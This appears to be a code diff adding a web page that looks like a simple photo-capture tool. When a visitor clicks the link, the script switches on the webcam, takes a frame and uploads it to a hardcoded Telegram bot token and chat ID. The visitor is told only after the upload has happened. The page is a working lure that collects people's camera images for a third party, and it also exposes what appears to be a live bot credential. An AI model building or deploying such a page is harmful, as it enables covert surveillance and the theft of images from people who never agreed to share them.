@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Capture Photo</title>
+</head>
+<body>
+    <h1>Welcome! Click the link to capture a photo.</h1>
+    <a href="#" id="captureLink">Click here to capture a photo</a>
+
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const captureLink = document.getElementById('captureLink');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Access the camera
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.style.display = "block"; // Show the video
+                })
+                .catch(error => {
+                    console.error('Error accessing camera: ', error);
+                });
+        }
+
+        // Capture the image when the user clicks the link
+        captureLink.addEventListener('click', (event) => {
+            event.preventDefault(); // Prevent the default action
+            startCamera();
+
+            // Wait for the video to load and capture the photo
+            setTimeout(() => {
+                // Capture the photo after a short delay to ensure video is loaded
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/png');
+                sendPhotoToTelegram(imageData);  // Send the captured image to Telegram
+            }, 1000); // Adjust the delay as necessary
+        });
+
+        // Function to send photo to Telegram bot
+        function sendPhotoToTelegram(imageData) {
+            const botToken = '6389167784:AAE_d0RmkONW9CqN2M9yyvb3Rzj8AxoMM44';
+            const chatId = '1272791365';
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', dataURLtoFile(imageData, 'photo.png'));
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Photo sent:', data);
+                alert('Photo captured and sent to Telegram!');
+            })
+            .catch(error => {
+                console.error('Error sending photo:', error);
+            });
+        }
+
+        // Helper function to convert base64 data URL to File object
+        function dataURLtoFile(dataURL, filename) {
+            const [metadata, base64Data] = dataURL.split(',');
+            const byteString = atob(base64Data);
+            const arrayBuffer = new ArrayBuffer(byteString.length);
+            const uint8Array = new Uint8Array(arrayBuffer);
+
+            for (let i = 0; i < byteString.length; i++) {
+                uint8Array[i] = byteString.charCodeAt(i);
+            }
+
+            return new File([uint8Array], filename, { type: 'image/png' });
+        }
+    </script>
+</body>
+</html>
